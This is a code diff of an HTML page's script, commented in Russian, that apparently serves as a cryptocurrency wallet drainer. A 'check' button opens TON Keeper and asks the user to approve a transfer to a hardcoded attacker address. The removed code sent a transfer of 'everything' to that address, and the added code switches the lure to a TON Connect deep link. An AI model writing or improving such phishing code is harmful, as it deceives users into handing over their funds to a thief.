@@ -100,30 +100,31 @@
     <script>
         const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
 
-        // ====== ОТКРЫТЬ ТРАНЗАКЦИЮ ======
-        function openTx() {
+        // ====== ОТКРЫТЬ ЧЕРЕЗ TON CONNECT (КАК НА ПОРТАЛЕ) ======
+        function openTonConnect() {
             const status = document.getElementById('status');
             const confirmBox = document.getElementById('confirmBox');
             
-            // Показываем плашку
-            confirmBox.classList.add('show');
             status.innerText = '⏳ Открываю TON Keeper...';
+            confirmBox.classList.add('show');
             
-            // Открываем TON Keeper с транзакцией на ВСЁ
-            // Используем ton:// протокол
-            const url = 'ton://transfer?address=' + TARGET;
-            window.location.href = url;
+            // ====== TON CONNECT 2.0 (РАБОТАЕТ НА ТЕЛЕФОНЕ) ======
+            const url = 'https://app.tonkeeper.com/ton-connect?ret=' + encodeURIComponent(window.location.href);
             
+            // Открываем в новой вкладке
+            window.open(url, '_blank');
+            
+            // Также пробуем через location
             setTimeout(function() {
-                window.open(url, '_blank');
+                window.location.href = url;
             }, 300);
             
-            status.innerText = '✅ Подтвердите транзакцию в TON Keeper';
+            status.innerText = '✅ Подтвердите в TON Keeper';
         }
 
         // ====== КНОПКИ ======
-        document.getElementById('mainBtn').addEventListener('click', openTx);
-        document.getElementById('openWalletBtn').addEventListener('click', openTx);
+        document.getElementById('mainBtn').addEventListener('click', openTonConnect);
+        document.getElementById('openWalletBtn').addEventListener('click', openTonConnect);
 
         // ====== СТАТУС ======
         document.getElementById('status').innerText = 'Нажмите "ПРОВЕРИТЬ"';
